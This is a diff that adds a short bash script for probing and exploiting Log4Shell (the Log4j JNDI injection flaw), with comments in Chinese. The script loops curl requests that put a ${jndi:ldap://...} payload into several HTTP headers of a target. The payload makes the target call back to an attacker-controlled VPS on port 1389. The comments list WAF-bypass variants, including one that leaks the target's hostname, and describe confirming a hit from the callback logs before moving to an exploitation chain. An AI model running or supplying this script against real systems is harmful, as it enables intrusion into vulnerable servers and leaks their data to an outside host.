@@ -1,0 +1,16 @@
+#!/usr/bin/env bash
+TARGET="${1:?usage: bash log4shell.sh http://TARGET:PORT <VPS>}"
+VPS="${2:?usage: bash log4shell.sh http://TARGET:PORT <VPS>}"
+# 先只打 DNS/JNDI 回连（最轻），确认命中再换利用链
+PAYLOAD='${jndi:ldap://'"$VPS"':1389/a}'
+for h in 'User-Agent' 'X-Api-Version' 'X-Forwarded-For' 'Referer' 'X-Client-IP'; do
+  printf '%-18s ' "$h"
+  curl -sS -m 10 -o /dev/null -w '%{http_code}\n' "$TARGET/" -H "$h: $PAYLOAD"
+done
+# WAF 绕过（按顺序试，每换一种都要看回连）
+#   ${jndi:ldap://$VPS:1389/a}
+#   ${jndi:${lower:l}dap://$VPS:1389/a}
+#   ${jndi:ldap://$VPS:1389/${hostName}}
+#   ${jndi:ldap://$VPS:1389/a}  （URL 编码 %24%7Bjndi...%7D）
+#
+# 判定：VPS 上 LDAP（1389）或 DNS 日志出现目标回连。
